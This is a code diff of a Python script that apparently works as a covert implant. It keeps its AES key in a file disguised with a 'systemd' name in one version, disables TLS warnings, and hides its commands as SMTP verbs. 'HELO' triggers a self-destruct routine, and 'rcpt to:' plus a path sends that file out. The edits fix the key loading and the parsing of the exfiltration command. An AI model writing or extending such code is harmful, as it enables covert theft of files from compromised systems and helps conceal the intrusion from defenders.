@@ -18,11 +18,11 @@ import hashlib
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 BLOCK_SIZE = 16
-#KEY = "your_secret_key_here"  # Replace with your actual key
-
+# KEY = "your_secret_key_here"  # Replace with your actual key
+key_path = "./key.txt"
 
 def get_key():
-    with open("/tmp/systemd_private_key") as f:
+    with open(key_path, 'rb') as f:
         return f.read()
 
 KEY = get_key()
@@ -41,7 +41,7 @@ def undo_everything(data):
 
 
 def aes_encrypt(plaintext, key):
-    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
+    key_bytes = hashlib.sha256(key).digest()[:16]
     iv = os.urandom(BLOCK_SIZE)
 
     # PKCS7 padding
@@ -55,7 +55,7 @@ def aes_encrypt(plaintext, key):
     return base64.b64encode(iv + encrypted).decode()
 
 def aes_decrypt(ciphertext_b64, key):
-    key_bytes = hashlib.sha256(key.encode()).digest()[:16]
+    key_bytes = hashlib.sha256(key).digest()[:16]
     raw = base64.b64decode(ciphertext_b64)
     iv = raw[:BLOCK_SIZE]
     encrypted = raw[BLOCK_SIZE:]
@@ -233,8 +233,8 @@ def main():
             if cmd.strip() == "HELO":
                 self_destruct()
                 return
-            elif cmd.strip().split()[0]=="rcpt to:":
-                file_path = cmd.strip().split()[1]
+            elif cmd.strip().split('!')[0].strip()=="rcpt to:":
+                file_path = cmd.strip().split('!')[1].strip()
                 if os.path.exists(file_path):
                     send_file(file_path)
                 else:
